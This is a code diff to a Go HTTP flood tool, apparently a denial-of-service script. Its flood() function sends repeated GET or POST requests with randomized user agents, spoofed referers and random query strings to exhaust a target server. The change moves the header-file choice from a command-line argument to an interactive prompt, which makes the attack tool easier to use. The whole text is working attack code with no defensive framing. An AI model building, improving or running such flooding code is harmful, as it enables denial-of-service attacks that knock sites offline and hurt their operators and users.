@@ -69,6 +69,7 @@ var (
 		"https://www.ted.com/search?q=",
 		"https://play.google.com/store/search?q=",
 	}
+	headerFile = "header.txt" // Default header file
 )
 
 func init() {
@@ -123,14 +124,14 @@ func flood() {
 	if mode == "get" {
 		header += " HTTP/1.1\r\nHost: "
 		header += addr + "\r\n"
-		if os.Args[5] == "nil" {
+		if headerFile == "nil" {
 			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
 			header += "User-Agent: " + getuseragent() + "\r\n"
 			header += acceptall[rand.Intn(len(acceptall))]
 			header += referers[rand.Intn(len(referers))] + "\r\n"
 		} else {
 			func() {
-				fi, err := os.Open(os.Args[5])
+				fi, err := os.Open(headerFile)
 				if err != nil {
 					fmt.Printf("Error: %s\n", err)
 					return
@@ -148,9 +149,9 @@ func flood() {
 		}
 	} else if mode == "post" {
 		data := ""
-		if os.Args[5] != "nil" {
+		if headerFile != "nil" {
 			func() {
-				fi, err := os.Open(os.Args[5])
+				fi, err := os.Open(headerFile)
 				if err != nil {
 					fmt.Printf("Error: %s\n", err)
 					return
@@ -165,7 +166,6 @@ func flood() {
 					header += string(a) + "\r\n"
 				}
 			}()
-
 		} else {
 			data = "f"
 		}
@@ -191,7 +191,7 @@ func flood() {
 		} else {
 			for i := 0; i < 100; i++ {
 				request := ""
-				if os.Args[3] == "get" {
+				if mode == "get" {
 					request += "GET " + page + key
 					request += strconv.Itoa(rand.Intn(2147483647)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
 				}
@@ -239,8 +239,9 @@ func main() {
 		return
 	}
 
-	headerFile := "header.txt"
-	fmt.Printf("Using header file: %s\n", headerFile)
+	fmt.Print("Input the header file (or 'nil' for default): ")
+	headerFile, _ = reader.ReadString('\n')
+	headerFile = strings.TrimSpace(headerFile)
 
 	u, err := url.Parse(targetURL)
 	if err != nil {
